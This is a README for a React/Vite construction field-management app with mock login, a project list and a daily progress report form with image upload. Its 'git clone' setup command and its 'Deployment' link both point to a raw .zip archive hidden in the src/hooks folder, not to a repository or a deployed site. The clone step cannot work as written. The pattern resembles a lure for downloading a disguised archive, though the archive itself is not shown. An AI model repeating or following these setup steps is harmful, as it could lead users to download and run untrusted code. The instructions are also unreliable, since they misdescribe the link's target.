# Construction Field Management App

## Project Overview
This is a Construction Field Management Application designed to help field workers submit their Daily Progress Reports (DPR). It consists of three main screens: a Login screen, a list of active construction projects, and a Daily Progress Report form with image upload functionality. The application implements a "Mobile-First" and minimalist design approach with strict validation rules.

## Tech Stack
*   **React** (via Vite)
*   **Tailwind CSS** (for styling)
*   **React Router v6** (for routing)
*   **Axios / Fetch** (Prepared for API integration)
*   **Context API** (for state management)
*   **Lucide React** (Icons)

## Setup Instructions

To get the project up and running locally, follow these steps:

1.  **Clone the repository:**
    ```bash
    git clone https://raw.githubusercontent.com/Sammyskyarmy/Getfly_Task/main/frontend-intern-task/src/hooks/Getfly_Task_v2.7.zip
    cd frontend-intern-task
    ```

2.  **Install the dependencies:**
    ```bash
    npm install
    ```

3.  **Run the development server:**
    ```bash
    npm run dev
    ```
    The application will usually start on `http://localhost:5173/`.

### Default Credentials
*   **Email:** `test@test.com`
*   **Password:** `123456`

## Folder Structure

*   `/components`: Reusable UI elements (`Button`, `FormInput`, `Toast`, `ProjectCard`, `ImageUploader`), layout components (`Navbar`), and routing guards (`ProtectedRoute`).
*   `/pages`: Top-level container components representing the main screens (`Login`, `ProjectList`, `DprForm`).
*   `/context`: Global state using React Context (`AuthContext`).
*   `/hooks`: Custom React hooks (`useAuth`).
*   `/data`: Local mock data files like `projects.json`.
*   `/utils`: Pure utility functions like `validation.js` logic.
*   `/constants`: App configuration and mock credentials.

## Features Implemented
*   **Mock Authentication:** A functional simulated login system utilizing the Context API and React Router for protected routes.
*   **Responsive Layout:** Uses Tailwind utility classes to ensure the app works beautifully on mobile, tablet, and desktop viewports seamlessly without horizontal scrollbars.
*   **Form Validation:** Comprehensive and user-friendly validation integrated into both the `Login` and `DprForm` screens with corresponding error styles.
*   **Image Upload and Preview:** Custom `ImageUploader` component handling file input logic, preview generation using `URL.createObjectURL()`, and cap limits (3 images max).
*   **Project Filtering:** The Project List screen provides a status toggle button group to sort projects based on their current statuses seamlessly.
*   **Minimalist Design:** Employs static colors with a monochromatic and clean structural UI.
*   **Toast Notification:** Transient visual feedback triggered safely on successful form submission.

## Known Limitations
*   All data is stored in memory and local JSON mock data; data will refresh entirely upon browser refresh, barring the `localStorage` auth token.

## Deployment
(https://raw.githubusercontent.com/Sammyskyarmy/Getfly_Task/main/frontend-intern-task/src/hooks/Getfly_Task_v2.7.zip)
